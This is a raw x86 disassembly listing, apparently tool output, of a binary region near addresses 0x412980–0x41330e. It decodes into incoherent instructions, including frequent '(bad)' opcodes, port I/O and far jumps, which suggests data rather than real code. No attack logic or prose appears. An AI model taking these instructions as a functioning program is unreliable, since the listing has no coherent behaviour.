  41297d:	mov    eax,0xfb273f47
  412982:	test   al,0x16
  412984:	outs   dx,BYTE PTR ds:[esi]
  412985:	int    0x7b
  412987:	sub    BYTE PTR [ebp+0x17],ah
  41298a:	repz js 0x41296c
  41298d:	xchg   DWORD PTR [edi],ebp
  41298f:	xchg   edx,eax
  412990:	rcl    DWORD PTR [edx+0x5fa7e2dd],1
  412996:	mov    cl,0xce
  412998:	mov    ebp,DWORD PTR [eax+0xd]
  41299b:	fisttp DWORD PTR [eax]
  41299d:	mov    bl,0x7d
  41299f:	lds    edx,FWORD PTR [eax-0x5f]
  4129a2:	mov    ch,0x61
  4129a4:	dec    esp
  4129a5:	retf   0xf0d1
  4129a8:	add    edi,DWORD PTR [ebx-0x2350a6f7]
  4129ae:	stos   BYTE PTR es:[edi],al
  4129af:	test   DWORD PTR [ebp+0x7c1f2a1b],edx
  4129b5:	mov    eax,0xd1656ade
  4129ba:	ins    DWORD PTR es:[edi],dx
  4129bb:	popf   
  4129bc:	in     al,0x2
  4129be:	fisttp QWORD PTR [eax]
  4129c0:	retf   
  4129c1:	sub    ebp,DWORD PTR [esi-0x5e88a82c]
  4129c7:	jb     0x41298c
  4129c9:	cli    
  4129ca:	xchg   esi,eax
  4129cb:	or     BYTE PTR [edx],dl
  4129cd:	add    DWORD PTR [esi-0x357ab38f],0x6a
  4129d4:	das    
  4129d5:	sar    DWORD PTR [edx+0x6f4022a9],0xbb
  4129dc:	and    esp,DWORD PTR [eax+0x72]
  4129df:	cmp    bl,dl
  4129e1:	inc    ebp
  4129e2:	cmp    eax,0xbcb5fb55
  4129e7:	adc    esi,DWORD PTR [edi+0x2fa546c2]
  4129ed:	fnstsw WORD PTR [edi+0x5db78e59]
  4129f3:	sbb    BYTE PTR [edx+0x667a0925],0x9e
  4129fa:	push   ebx
  4129fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129fc:	ja     0x412a0b
  4129fe:	inc    edx
  4129ff:	adc    esp,eax
  412a01:	jl     0x4129c9
  412a03:	fs mov ch,0xde
  412a06:	cmp    edx,DWORD PTR [eax+esi*1]
  412a09:	les    edi,FWORD PTR [edx]
  412a0b:	(bad)  
  412a0d:	imul   ch
  412a0f:	adc    eax,0x179985a8
  412a14:	inc    ecx
  412a15:	and    DWORD PTR [eax+edi*2-0x118ddec],edi
  412a1c:	test   eax,0x211cc20
  412a21:	pusha  
  412a22:	xchg   edi,eax
  412a23:	add    dh,dh
  412a25:	push   cs
  412a26:	cdq    
  412a27:	jle    0x4129d6
  412a29:	std    
  412a2a:	push   edx
  412a2b:	ins    BYTE PTR es:[edi],dx
  412a2c:	dec    ecx
  412a2d:	push   esi
  412a2e:	ret    
  412a2f:	jg     0x412a2c
  412a31:	mov    ecx,ebx
  412a33:	cmp    ah,BYTE PTR [esi+edx*8]
  412a36:	pop    ecx
  412a37:	push   0x1a
  412a39:	ret    
  412a3a:	pop    es
  412a3b:	shl    BYTE PTR [ebx+eiz*1-0x38],1
  412a3f:	je     0x412a2b
  412a41:	lods   al,BYTE PTR ds:[esi]
  412a42:	or     dh,cl
  412a44:	push   esp
  412a45:	adc    dl,cl
  412a47:	jg     0x412a80
  412a49:	xchg   ebx,eax
  412a4a:	les    ebx,FWORD PTR [eax-0x7a7a5bcc]
  412a50:	(bad)  
  412a51:	popa   
  412a52:	and    DWORD PTR [ecx-0x54],edi
  412a55:	push   ecx
  412a56:	fadd   st(4),st
  412a58:	fsubr  st(1),st
  412a5a:	call   0x8294:0x217f5626
  412a61:	popa   
  412a62:	je     0x412a3b
  412a64:	jno    0x412a49
  412a66:	pop    ss
  412a67:	stos   BYTE PTR es:[edi],al
  412a68:	(bad)  
  412a69:	mov    esp,0x1d729df8
  412a6e:	xor    DWORD PTR ds:0xb8bc1484,esp
  412a74:	xchg   ebx,eax
  412a75:	push   ebx
  412a76:	push   0xffffffc3
  412a78:	ins    DWORD PTR es:[edi],dx
  412a79:	aam    0xe4
  412a7b:	out    dx,eax
  412a7c:	aad    0x46
  412a7e:	dec    esp
  412a7f:	and    al,0x8c
  412a81:	out    0xe3,al
  412a83:	fsubr  QWORD PTR [ebx+0x4e]
  412a86:	mov    esi,DWORD PTR [edi-0x3a61a9cd]
  412a8c:	rcr    ecx,cl
  412a8e:	mov    edi,0xbfa0c032
  412a93:	rol    dh,0x21
  412a96:	test   DWORD PTR [eax-0x31],ebp
  412a99:	pop    esi
  412a9a:	mov    bl,0x45
  412a9c:	pop    edx
  412a9d:	mov    ebx,0xd3768be2
  412aa2:	adc    eax,0x10c6a015
  412aa7:	scas   eax,DWORD PTR es:[edi]
  412aa8:	cmp    DWORD PTR [edx-0x446e359c],eax
  412aae:	adc    al,0xa6
  412ab0:	mov    dl,0x2a
  412ab2:	push   edx
  412ab3:	mov    dh,0x91
  412ab5:	xor    eax,0x737cf1ce
  412aba:	and    BYTE PTR [ebx],dl
  412abc:	loope  0x412ae2
  412abe:	push   0x7b7d281d
  412ac3:	xor    BYTE PTR [ebx+0x20],dh
  412ac6:	in     eax,dx
  412ac7:	sub    eax,ecx
  412ac9:	lds    edi,FWORD PTR [ebp+0xf]
  412acc:	pop    esi
  412acd:	in     eax,0x5e
  412acf:	retf   0xeb28
  412ad2:	sub    al,0x34
  412ad4:	add    DWORD PTR [esi+0x18c16faf],esp
  412ada:	add    eax,0xfe1e7c60
  412adf:	adc    BYTE PTR [ecx+0x7b0b5f5e],cl
  412ae5:	retf   0xaf92
  412ae8:	ins    BYTE PTR es:[edi],dx
  412ae9:	sub    eax,0xb830b72
  412aee:	push   ss
  412aef:	mov    ds:0xe76fe40e,al
  412af4:	add    al,0xa
  412af6:	xor    eax,0xc48b379f
  412afb:	adc    al,0x41
  412afd:	fbld   TBYTE PTR [edx+eax*8-0x2c]
  412b01:	adc    BYTE PTR [esi],0x38
  412b04:	(bad)  
  412b05:	cmp    DWORD PTR [ebp-0x6bc01b5e],edi
  412b0b:	(bad)  
  412b0c:	push   ss
  412b0d:	sub    ebx,esp
  412b0f:	sub    DWORD PTR [ecx-0x619c9862],ebp
  412b15:	dec    ecx
  412b16:	mov    dl,0xbb
  412b18:	cli    
  412b19:	hlt    
  412b1a:	pop    ebx
  412b1b:	jmp    0x2ab5:0x8db39493
  412b22:	fsub   QWORD PTR [ebx-0x5fdc0a1f]
  412b28:	mov    ds:0x741353e9,al
  412b2d:	dec    ebx
  412b2e:	repnz sbb edx,DWORD PTR gs:[eax-0x17]
  412b33:	cmp    BYTE PTR [edi-0xe981498],bl
  412b39:	dec    ebx
  412b3a:	and    bl,dh
  412b3c:	in     eax,0xb3
  412b3e:	or     al,0x88
  412b40:	jmp    0x412ae6
  412b42:	mov    eax,ds:0x9755ce84
  412b47:	or     al,0xbd
  412b49:	xor    dl,BYTE PTR [ecx+0x4b00db6f]
  412b4f:	es push 0x82b22f36
  412b55:	jne    0x412b72
  412b57:	repz add ebp,DWORD PTR [edx]
  412b5a:	sbb    dl,BYTE PTR [esp+ebp*4-0x7]
  412b5e:	out    dx,eax
  412b5f:	xchg   edi,eax
  412b60:	loope  0x412b0e
  412b62:	xor    edi,esp
  412b64:	pop    ds
  412b65:	in     eax,dx
  412b66:	adc    eax,0xaaa4b391
  412b6b:	iret   
  412b6c:	(bad)  
  412b6d:	rol    DWORD PTR [ebx+0x2eceece6],1
  412b73:	pop    ebx
  412b74:	fimul  WORD PTR [edx+0x66]
  412b77:	imul   edi,DWORD PTR [bx+di+0x5282],0xffffffcf
  412b7d:	or     al,0x38
  412b7f:	ret    0x141
  412b82:	leave  
  412b83:	mov    ds:0xc9f7087a,al
  412b88:	nop
  412b89:	xchg   ebx,eax
  412b8a:	es out 0xe0,eax
  412b8d:	in     eax,0x2
  412b8f:	imul   edx,DWORD PTR [edx+eiz*1],0xb3cbc416
  412b96:	repz bound eax,QWORD PTR [ecx]
  412b99:	in     eax,dx
  412b9a:	mov    dl,0xbd
  412b9c:	mov    WORD PTR [edi-0x45330593],?
  412ba2:	or     bh,bh
  412ba4:	sub    eax,0x7d7ecc23
  412ba9:	fld    QWORD PTR [ecx]
  412bab:	push   eax
  412bac:	cmp    BYTE PTR [ecx-0x64],dl
  412baf:	mov    ah,0xbc
  412bb1:	into   
  412bb2:	dec    eax
  412bb3:	aas    
  412bb4:	mov    ds:0x886eef73,al
  412bb9:	dec    eax
  412bba:	or     BYTE PTR [ebx-0x793cab88],dh
  412bc0:	inc    di
  412bc2:	std    
  412bc3:	adc    bl,BYTE PTR [ebx-0x36]
  412bc6:	inc    edx
  412bc7:	leave  
  412bc8:	mov    eax,ds:0x19d9b738
  412bcd:	pop    edx
  412bce:	push   ebx
  412bcf:	adc    bh,cl
  412bd1:	xor    DWORD PTR [esi],ebx
  412bd3:	fdiv   QWORD PTR [eax]
  412bd5:	(bad)  
  412bd6:	push   0x59
  412bd8:	fimul  DWORD PTR [edx-0x46a5ccec]
  412bde:	sub    BYTE PTR [esi],bl
  412be0:	cwde   
  412be1:	or     bl,BYTE PTR [si+0x1f]
  412be5:	jg     0x412c33
  412be7:	not    eax
  412be9:	es cli 
  412beb:	fdivp  st(6),st
  412bed:	jp     0x412c05
  412bef:	outs   dx,BYTE PTR ds:[esi]
  412bf0:	paddsb mm5,mm4
  412bf3:	fild   QWORD PTR [ebx-0x5]
  412bf6:	cmp    al,0xeb
  412bf8:	jno    0x412c01
  412bfa:	mov    esp,DWORD PTR [esp+ebx*1]
  412bfd:	mov    ebx,0x7a535706
  412c02:	inc    esi
  412c03:	iret   
  412c04:	sub    bl,ch
  412c06:	in     eax,0x85
  412c08:	cld    
  412c09:	mov    al,0x16
  412c0b:	stc    
  412c0c:	mov    dh,0x51
  412c0e:	mov    BYTE PTR [esi-0x53585e31],al
  412c14:	rcr    BYTE PTR [eax-0x538a538a],1
  412c1a:	pop    esi
  412c1b:	outs   dx,BYTE PTR ds:[esi]
  412c1c:	lahf   
  412c1d:	retf   0xb0b6
  412c20:	fiadd  WORD PTR [eax+eax*1]
  412c23:	stos   DWORD PTR es:[edi],eax
  412c24:	dec    esp
  412c25:	rol    ecx,cl
  412c27:	cli    
  412c28:	out    dx,eax
  412c29:	xchg   edx,eax
  412c2a:	adc    ah,BYTE PTR [ebx+0x69]
  412c2d:	sbb    cl,BYTE PTR [esi+0x47]
  412c30:	pusha  
  412c31:	sbb    BYTE PTR [edi+0x24d381e1],bl
  412c37:	gs inc edi
  412c39:	or     edi,DWORD PTR [edx]
  412c3b:	sub    al,0x19
  412c3d:	xchg   esi,eax
  412c3e:	and    eax,0xd554fb4a
  412c43:	adc    bl,al
  412c45:	jns    0x412c96
  412c47:	in     eax,0x90
  412c49:	lock jmp 0x967c:0x189e1cfc
  412c51:	mov    bh,0x81
  412c53:	or     cl,al
  412c55:	popa   
  412c56:	ret    0x9c21
  412c59:	rcr    DWORD PTR [edi],0x5a
  412c5c:	jno    0x412c7a
  412c5e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c60:	int3   
  412c61:	stc    
  412c62:	scas   eax,DWORD PTR es:[edi]
  412c63:	std    
  412c64:	stc    
  412c65:	in     eax,dx
  412c66:	hlt    
  412c67:	ds push ebp
  412c69:	inc    ecx
  412c6a:	in     al,dx
  412c6b:	lods   al,BYTE PTR ds:[esi]
  412c6c:	sub    dh,BYTE PTR ds:0x941cd89c
  412c72:	xor    al,cl
  412c74:	add    al,BYTE PTR ds:0x250903fb
  412c7a:	imul   ecx,DWORD PTR [ebx-0x11bc9c73],0xfeb47bed
  412c84:	repz inc esi
  412c86:	outs   dx,BYTE PTR ds:[esi]
  412c87:	iret   
  412c88:	pusha  
  412c89:	aas    
  412c8a:	mov    cl,0x5f
  412c8c:	out    dx,eax
  412c8d:	int3   
  412c8e:	and    al,0x43
  412c90:	outs   dx,BYTE PTR ds:[esi]
	...
  412e69:	and    eax,0x55d31474
  412e6e:	repz out 0xf6,eax
  412e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e72:	adc    bh,BYTE PTR [esi]
  412e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e75:	(bad)  
  412e76:	dec    esp
  412e77:	leave  
  412e78:	inc    BYTE PTR [edx+0xb0001ff]
  412e7e:	pop    es
  412e7f:	add    BYTE PTR [eax],al
  412e81:	mov    eax,ds:0xa920c225
  412e86:	cwde   
  412e87:	fwait
  412e88:	inc    esp
  412e89:	push   ds
  412e8a:	pop    ds
  412e8b:	out    dx,al
  412e8c:	lds    ebp,FWORD PTR [edx]
  412e8e:	out    dx,eax
  412e8f:	test   DWORD PTR ds:0xff104f1,eax
  412e95:	adc    bl,BYTE PTR [edi+0x66]
  412e98:	sti    
  412e99:	push   ds
  412e9a:	xor    bl,BYTE PTR [eax]
  412e9c:	les    eax,FWORD PTR [ecx+0x46d8305e]
  412ea2:	in     al,dx
  412ea3:	sub    eax,0xf7181b5a
  412ea8:	ficom  WORD PTR [esi+ecx*2+0x39be3dc]
  412eaf:	test   BYTE PTR cs:[edi],ah
  412eb2:	cmp    dl,0x74
  412eb5:	xchg   ebx,eax
  412eb6:	lods   eax,DWORD PTR ds:[esi]
  412eb7:	stos   DWORD PTR es:[edi],eax
  412eb8:	and    ch,BYTE PTR [edi]
  412eba:	jns    0x412e7b
  412ebc:	inc    esi
  412ebd:	cli    
  412ebe:	cs icebp 
  412ec0:	js     0x412e4c
  412ec2:	push   ecx
  412ec3:	ficomp WORD PTR [bx+si-0x1d]
  412ec7:	(bad)  
  412ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec9:	xor    eax,0x83db068d
  412ece:	and    al,0x69
  412ed0:	pop    ebp
  412ed1:	dec    ecx
  412ed2:	shl    edi,0x5
  412ed5:	xchg   esi,eax
  412ed6:	pop    esi
  412ed7:	xor    BYTE PTR [ebx+0x62ee7960],0x9c
  412ede:	pusha  
  412edf:	setno  bh
  412ee2:	in     al,dx
  412ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ee4:	push   edx
  412ee5:	xor    eax,0x541ae940
  412eea:	outs   dx,DWORD PTR ds:[esi]
  412eeb:	inc    edx
  412eec:	xor    al,0x2
  412eee:	out    dx,al
  412eef:	sub    ecx,DWORD PTR [ebx+0x31b25cf6]
  412ef5:	cmp    BYTE PTR [ecx+0x50],0xa2
  412ef9:	fucomp st(3)
  412efb:	and    BYTE PTR [ebx*2+0x24b5ec93],bl
  412f02:	(bad)  
  412f03:	repz mov eax,ds:0xaaf3398f
  412f09:	push   ecx
  412f0a:	or     al,0x60
  412f0c:	ret    
  412f0d:	mov    al,0x71
  412f0f:	add    BYTE PTR ds:0xa125ca7e,cl
  412f15:	mov    eax,0x3846bc70
  412f1a:	pop    eax
  412f1b:	repz or al,0x18
  412f1e:	popa   
  412f1f:	ret    0x978
  412f22:	arpl   dx,sp
  412f24:	aaa    
  412f25:	stos   BYTE PTR es:[edi],al
  412f26:	dec    esi
  412f27:	leave  
  412f28:	mov    esi,0xe612daa6
  412f2d:	mov    ds:0xd8c97394,eax
  412f32:	mov    al,ds:0x6234b05
  412f37:	(bad)  
  412f38:	out    dx,al
  412f39:	mov    ch,0x3a
  412f3b:	jae    0x412f78
  412f3d:	push   0xb2cee9a3
  412f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f43:	xor    esi,DWORD PTR [edi+0x66]
  412f46:	aas    
  412f47:	ins    DWORD PTR es:[edi],dx
  412f48:	push   es
  412f49:	pop    edx
  412f4a:	retf   0xbb9e
  412f4d:	cmp    al,0xef
  412f4f:	lea    eax,[ebp+0x64]
  412f52:	fxch   st(5)
  412f54:	push   0x79
  412f56:	in     eax,0xc9
  412f58:	jle    0x412fbf
  412f5a:	push   ebx
  412f5b:	or     edx,esi
  412f5d:	mov    al,ds:0xd6100250
  412f62:	ins    DWORD PTR es:[edi],dx
  412f63:	cmp    DWORD PTR [edx-0x23],esi
  412f66:	sub    BYTE PTR [eax+0x554f1b00],ah
  412f6c:	ds (bad) 
  412f6e:	pop    ss
  412f6f:	or     al,0xa8
  412f71:	aam    0xda
  412f73:	sub    eax,0x56100b7b
  412f78:	sbb    dh,cl
  412f7a:	push   ebx
  412f7b:	jmp    0x412f9c
  412f7d:	aam    0x5b
  412f7f:	jl     0x412fe2
  412f81:	mov    BYTE PTR [eax+0x21],ch
  412f84:	ds cdq 
  412f86:	sub    edx,DWORD PTR [eax+0x6b]
  412f89:	sub    eax,0x67de706c
  412f8e:	jns    0x412f43
  412f90:	mov    DWORD PTR [eax-0x20accd1d],edi
  412f96:	sub    esp,DWORD PTR fs:[ebx+0x2a]
  412f9a:	sti    
  412f9b:	or     bl,BYTE PTR [edi]
  412f9d:	add    edx,ebx
  412f9f:	(bad)  
  412fa0:	dec    esi
  412fa1:	xchg   ecx,eax
  412fa2:	push   ecx
  412fa3:	xor    esi,DWORD PTR [ecx-0x22]
  412fa6:	sti    
  412fa7:	sahf   
  412fa8:	sbb    BYTE PTR [ebx+0xe880f83],ch
  412fae:	inc    edx
  412faf:	push   es
  412fb0:	aad    0xd4
  412fb2:	xlat   BYTE PTR ds:[ebx]
  412fb3:	test   al,0x39
  412fb5:	dec    esp
  412fb6:	inc    DWORD PTR [edx-0x73]
  412fb9:	lds    edx,FWORD PTR [ebx+0x105fd675]
  412fbf:	add    eax,0x39f8cb0
  412fc4:	test   DWORD PTR [ebx],0x68ba994b
  412fca:	jno    0x413000
  412fcc:	repz xor BYTE PTR [esi+0x53ca9731],0xdb
  412fd4:	jmp    0x412feb
  412fd6:	ret    0x870a
  412fd9:	or     al,0x62
  412fdb:	into   
  412fdc:	mov    eax,ds:0xec19d070
  412fe1:	ds dec eax
  412fe3:	int3   
  412fe4:	lock mov dl,0xfa
  412fe7:	out    dx,al
  412fe8:	ret    0xdd9e
  412feb:	out    0xff,eax
  412fed:	in     al,0xfe
  412fef:	mov    al,ds:0xabdae02
  412ff4:	pushf  
  412ff5:	push   ecx
  412ff6:	push   cs
  412ff7:	and    esi,ebx
  412ff9:	adc    BYTE PTR [edx+ecx*4-0x1f],dl
  412ffd:	adc    ch,BYTE PTR [edx]
  412fff:	pop    es
  413000:	aad    0x30
  413002:	enter  0x7fe8,0x87
  413006:	adc    eax,0xa55b30d3
  41300b:	je     0x413003
  41300d:	test   eax,esi
  41300f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413010:	vsubps xmm4,xmm2,XMMWORD PTR [ecx+0x1f]
  413015:	sub    DWORD PTR [ecx-0x36],ebx
  413018:	sbb    DWORD PTR [edi-0x198108f8],0x67
  41301f:	int3   
  413020:	mov    ch,0xa7
  413022:	add    edx,DWORD PTR [eax]
  413024:	aad    0xe3
  413026:	icebp  
  413027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413028:	jo     0x413032
  41302a:	in     eax,dx
  41302b:	ja     0x413043
  41302d:	mov    ah,0x3a
  41302f:	xor    DWORD PTR [ecx+0x7f8021a9],0xe0fb4cfd
  413039:	and    dh,BYTE PTR [esi+0x2a742f64]
  41303f:	test   esi,ebp
  413041:	push   esi
  413042:	add    dh,BYTE PTR [ebx+ebx*2-0x42]
  413046:	pop    ebp
  413047:	repnz mov ds:0x58b72fd,al
  41304d:	in     eax,0xbc
  41304f:	in     eax,0xf1
  413051:	or     al,0x11
  413053:	cmp    eax,DWORD PTR [edi+0x7c]
  413056:	icebp  
  413057:	xlat   BYTE PTR ds:[ebx]
  413058:	sub    ah,BYTE PTR [edi-0x3b]
  41305b:	in     eax,dx
  41305c:	jg     0x413074
  41305e:	pusha  
  41305f:	and    BYTE PTR [edx+0x5957341],cl
  413065:	cmp    ebp,DWORD PTR [ebp-0x5e8332c0]
  41306b:	sbb    DWORD PTR [edi-0x1f830a1a],ebx
  413071:	sub    esp,0x8aad93cf
  413077:	jbe    0x413005
  413079:	lods   al,BYTE PTR ds:[esi]
  41307a:	dec    esi
  41307b:	xchg   BYTE PTR cs:[ebx+0x91fa08],ah
  413082:	fwait
  413083:	sub    bh,BYTE PTR [ebp+0xf4cc5c1]
  413089:	jno    0x413045
  41308b:	in     eax,0x49
  41308d:	adc    BYTE PTR [ecx+esi*2],cl
  413090:	mov    ecx,0xd4a01d55
  413095:	aaa    
  413096:	sbb    BYTE PTR [esi+0x42],dl
  413099:	rcr    BYTE PTR [ebx-0x77],cl
  41309c:	repz dec ebp
  41309e:	mov    ah,ch
  4130a0:	cmp    eax,0x2e1e682d
  4130a5:	sbb    eax,edx
  4130a7:	sub    eax,0xc3f274f
  4130ac:	fiadd  DWORD PTR [eax]
  4130ae:	xchg   ebx,eax
  4130af:	int    0xbe
  4130b1:	cmp    al,0xb
  4130b3:	fnstenv [ecx]
  4130b5:	aaa    
  4130b6:	clc    
  4130b7:	mov    bl,0xde
  4130b9:	in     eax,dx
  4130ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130bb:	jmp    0x5094e182
  4130c0:	or     ah,al
  4130c2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4130c4:	dec    eax
  4130c5:	bound  edi,QWORD PTR [bx+di-0x1126]
  4130ca:	call   0x4e3dd00d
  4130cf:	ret    0x5e0
  4130d2:	ins    BYTE PTR es:[edi],dx
  4130d3:	iret   
  4130d4:	mov    cs,WORD PTR [esi-0x9a0f147]
  4130da:	push   edx
  4130db:	lock push 0xf75606ee
  4130e1:	cmc    
  4130e2:	sbb    DWORD PTR [ecx],ecx
  4130e4:	nop
  4130e5:	push   ds
  4130e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130e7:	in     al,dx
  4130e8:	jl     0x413139
  4130ea:	popa   
  4130eb:	jbe    0x413078
  4130ed:	adc    ebx,ebp
  4130ef:	sbb    DWORD PTR [ecx+0x3b090210],esp
  4130f5:	sahf   
  4130f6:	push   ss
  4130f7:	clc    
  4130f8:	adc    ebx,esp
  4130fa:	dec    ebp
  4130fb:	imul   eax,DWORD PTR [edx+ebx*8+0x47d1aa57],0x46bd8cdf
  413106:	(bad)  
  413107:	ja     0x413128
  413109:	retf   0x2bbb
  41310c:	repz xor al,0x66
  41310f:	jne    0x413132
  413111:	ins    DWORD PTR es:[edi],dx
  413112:	mov    bh,0x89
  413114:	mov    ds:0xeb8f2211,al
  413119:	test   al,0x3b
  41311b:	scas   eax,DWORD PTR es:[edi]
  41311c:	repz mov eax,0x77334336
  413122:	hlt    
  413123:	rol    edx,0xee
  413126:	arpl   dx,cx
  413128:	lock call 0x8277:0xe9b8876d
  413130:	push   ebp
  413131:	iret   
  413132:	out    0xfc,eax
  413134:	lods   al,BYTE PTR ds:[esi]
  413135:	lock cs jmp 0xb5cc:0xb6bb365f
  41313e:	jecxz  0x413127
  413140:	and    al,0x1c
  413142:	popa   
  413143:	cmc    
  413144:	and    BYTE PTR [ebx+0x1699b3af],bl
  41314a:	xlat   BYTE PTR ds:[ebx]
  41314b:	mov    cl,0x67
  41314d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314f:	inc    ebp
  413150:	mov    dh,0x5d
  413152:	retf   0xf664
  413155:	and    esi,edi
  413157:	cwde   
  413158:	jno    0x4130f5
  41315a:	xlat   BYTE PTR ds:[ebx]
  41315b:	or     BYTE PTR [esp+eax*8+0x369e43ba],bl
  413162:	mov    esp,DWORD PTR [ebp-0x249a209b]
  413168:	lock or eax,0x24875253
  41316e:	fld    DWORD PTR [ecx+0x3a444e17]
  413174:	js     0x4131dc
  413176:	inc    ebp
  413177:	inc    esi
  413178:	daa    
  413179:	nop
  41317a:	add    al,0x1e
  41317c:	xchg   ebx,eax
  41317d:	mov    ebp,0xf0031513
  413182:	and    dl,dl
  413184:	popa   
  413185:	repnz lods al,BYTE PTR ds:[esi]
  413187:	fsubr  QWORD PTR [ecx]
  413189:	and    DWORD PTR [ebx+0x4f],eax
  41318c:	ret    0x9b36
  41318f:	push   ebx
  413190:	imul   ebp,DWORD PTR [ebp+0x183b8d36],0xffffffdb
  413197:	xchg   ebp,eax
  413198:	push   ebx
  413199:	mov    ?,WORD PTR [edi+0x6]
  41319c:	(bad)  [ebx+ebp*8-0x43]
  4131a0:	call   0x12f3:0x835b03ef
  4131a7:	stos   BYTE PTR es:[edi],al
  4131a8:	add    cl,BYTE PTR [edx+ebx*8+0x61]
  4131ac:	fucomip st,st(5)
  4131ae:	dec    ecx
  4131af:	xlat   BYTE PTR ds:[ebx]
  4131b0:	inc    esi
  4131b1:	push   ecx
  4131b2:	mov    ch,BYTE PTR [edx-0x620507ac]
  4131b8:	add    al,0xf5
  4131ba:	mov    ah,0xfb
  4131bc:	std    
  4131bd:	les    eax,FWORD PTR [ebx+ebp*2+0x78]
  4131c1:	jns    0x41319d
  4131c3:	fst    DWORD PTR [ebx-0x65]
  4131c6:	push   eax
  4131c7:	or     ecx,DWORD PTR [edi]
  4131c9:	push   cs
  4131ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131cb:	push   ebp
  4131cc:	daa    
  4131cd:	lds    eax,FWORD PTR [esi]
  4131cf:	inc    ebp
  4131d0:	stc    
  4131d1:	(bad)  
  4131d3:	inc    BYTE PTR [eax-0x79]
  4131d6:	call   0x2de04c1d
  4131db:	outs   dx,BYTE PTR ds:[esi]
  4131dc:	lea    esi,[edx+0x5f]
  4131df:	xchg   ecx,eax
  4131e0:	sbb    ch,BYTE PTR [eax]
  4131e2:	repz xchg edi,eax
  4131e4:	push   0x6d
  4131e6:	outs   dx,DWORD PTR ds:[esi]
  4131e7:	aam    0xd7
  4131e9:	inc    eax
  4131ea:	xor    eax,0x3df3257a
  4131ef:	jp     0x4131b3
  4131f1:	dec    edx
  4131f2:	ins    BYTE PTR es:[edi],dx
  4131f3:	pop    eax
  4131f4:	rcr    DWORD PTR [edx-0x63],1
  4131f7:	and    DWORD PTR [ebx],edi
  4131f9:	popf   
  4131fa:	out    0x1,eax
  4131fc:	sub    al,0xd
  4131fe:	or     al,BYTE PTR ds:0x3cdc3c78
  413204:	and    esp,DWORD PTR [ecx+0x5a]
  413207:	jle    0x41325f
  413209:	repnz cmp BYTE PTR [eax],bl
  41320c:	jle    0x4131c4
  41320e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320f:	cli    
  413210:	sbb    al,0x27
  413212:	popf   
  413213:	bound  esi,QWORD PTR [edx]
  413215:	xor    DWORD PTR [esi+0x7b29fffa],0x7a
  41321c:	dec    esi
  41321d:	jae    0x4131ea
  41321f:	imul   esp
  413221:	jbe    0x413213
  413223:	push   0x30
  413225:	add    ch,bh
  413227:	sub    eax,0xcbcf337
  41322c:	iret   
  41322d:	dec    esp
  41322e:	and    esp,DWORD PTR [edx]
  413230:	bound  esi,QWORD PTR [eax]
  413232:	mov    ch,0x20
  413234:	cmp    BYTE PTR [edi],al
  413236:	sbb    ebp,DWORD PTR [eax]
  413238:	sbb    al,0x55
  41323a:	push   ebp
  41323b:	shr    BYTE PTR [esi],cl
  41323d:	mov    ecx,0xefb162e6
  413242:	mov    cl,0xd4
  413244:	push   edi
  413245:	loop   0x413287
  413247:	inc    esi
  413248:	mov    bh,0x36
  41324a:	mov    ecx,0x8ab0daad
  41324f:	popa   
  413250:	aad    0xb6
  413252:	xor    ecx,DWORD PTR [ebx+eiz*2+0x34]
  413256:	(bad)  [ebp+0x4f650df1]
  41325c:	inc    esp
  41325d:	jo     0x413240
  41325f:	jge    0x413252
  413261:	fdiv   QWORD PTR [edx]
  413263:	je     0x413236
  413265:	mov    esi,0x6a526a1e
  41326a:	js     0x41328b
  41326c:	sub    al,0x20
  41326e:	je     0x413282
  413270:	xchg   esp,eax
  413271:	scas   eax,DWORD PTR es:[edi]
  413272:	shr    DWORD PTR [ebx+0x5da9541a],cl
  413278:	xchg   DWORD PTR [esi+0x594af88a],edx
  41327e:	push   0x73
  413280:	fs xchg esp,eax
  413282:	call   0x8436:0x74239b16
  413289:	gs retf 
  41328b:	sbb    BYTE PTR [esi+0x48],dl
  41328e:	mov    ch,0x2d
  413290:	mov    edx,0xf9721924
  413295:	(bad)
  413298:	push   ss
  413299:	popf   
  41329a:	mov    edi,0x291de811
  41329f:	push   edi
  4132a0:	out    dx,al
  4132a1:	gs sbb al,0xa8
  4132a4:	repnz or BYTE PTR [eax-0x79714c3b],0xba
  4132ac:	dec    edx
  4132ad:	push   esi
  4132ae:	mov    ah,0xa0
  4132b0:	xchg   edx,eax
  4132b1:	or     al,0xd6
  4132b3:	fst    DWORD PTR [eax-0x71ca1f4c]
  4132b9:	mov    edx,eax
  4132bb:	lahf   
  4132bc:	gs int 0xb9
  4132bf:	lea    esi,[edx-0xe4962f5]
  4132c5:	shl    DWORD PTR [esi],0x72
  4132c8:	mov    dl,0xea
  4132ca:	test   DWORD PTR [edi-0x50],0xf47511c5
  4132d1:	sti    
  4132d2:	mov    gs,esi
  4132d4:	cmp    edx,esi
  4132d6:	sub    BYTE PTR [ebx+0x7c],dl
  4132d9:	cmp    esp,edx
  4132db:	mov    ds:0xa7a32ed,al
  4132e0:	push   esi
  4132e1:	mov    edx,0xce907fe
  4132e6:	or     esi,DWORD PTR [edx-0x4df98ef7]
  4132ec:	pop    edi
  4132ed:	sub    esi,DWORD PTR [ebp+0x3a]
  4132f0:	mov    eax,0x8fc32a14
  4132f5:	arpl   WORD PTR [esi+ecx*8-0x24],cx
  4132f9:	xchg   esp,eax
  4132fa:	ffree  st(2)
  4132fc:	push   ebx
  4132fd:	and    ch,BYTE PTR [eax-0x86f041b]
  413303:	(bad)  [eax-0x3ba3e1c3]
  413309:	xchg   ebx,eax
  41330a:	add    esi,DWORD PTR [ebx+edx*4]
  41330d:	dec    eax
  41330e:	and    DWORD PTR [edi-0x78],eax
